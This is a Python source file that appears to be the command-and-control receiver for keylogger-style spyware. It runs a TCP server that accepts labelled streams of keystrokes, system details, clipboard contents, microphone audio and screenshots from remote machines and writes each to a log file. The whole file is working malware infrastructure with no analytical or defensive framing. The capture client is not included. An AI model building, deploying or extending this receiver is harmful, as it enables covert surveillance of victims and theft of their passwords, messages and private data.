import socketserver
import socket
from scipy.io.wavfile import write 
import numpy as np
from PIL import Image
import io

keys_information = "key_log.txt"
system_information = "system.txt"
clipboard_information = "clipboard.txt" 
audio_information = "audio.wav" 
screenshot_information = "screenshot.png" 

PORT = 5060
SERVER = socket.gethostbyname(socket.gethostname())

class MyTCPHandler(socketserver.BaseRequestHandler):

    def write_file(self, filename, data):
        try:
            f = open(filename, "a")
        except:
            f = open(filename, "w")
        f.write(data+"\n")
        f.close()

    def write_audio_file(self, filename, data):
        with open(filename,'wb') as f:
            l = data
            while l:
                if not l: 
                    break
                f.write(l)
                l = self.request.recv(4096)
        f.close()

    def write_image_file(self, filename, data):
        image_buffer = io.BytesIO(data)
        screenshot = Image.open(image_buffer)
        screenshot.save(filename)

    def handle(self):
        while True:
            type = self.request.recv(5)
            length = int.from_bytes(self.request.recv(4), byteorder='big')
            if str(type).find("key") > 0:
                print(type)
                data = self.request.recv(length).strip().decode("utf-8")
                self.write_file(keys_information, data)
            elif str(type).find("sys") > 0:
                print(type)
                data = self.request.recv(length).strip().decode("utf-8")
                self.write_file(system_information, data)
            elif str(type).find("clip") > 0:
                print(type)
                data = self.request.recv(length).strip().decode("utf-8")
                self.write_file(clipboard_information, data)
            elif str(type).find("audio") > 0:
                print(type)
                data = self.request.recv(length)
                self.write_audio_file(audio_information, data)
            elif str(type).find("image") > 0:
                print(type)
                data = self.request.recv(length)
                self.write_image_file(screenshot_information, data)

            if not type:
                print("{} disconnected".format(self.client_address[0]))
                break

if __name__ == "__main__":
    HOST, PORT = SERVER, PORT

    with socketserver.TCPServer((HOST, PORT), MyTCPHandler, True) as server:
        print("Waiting...")
        server.serve_forever()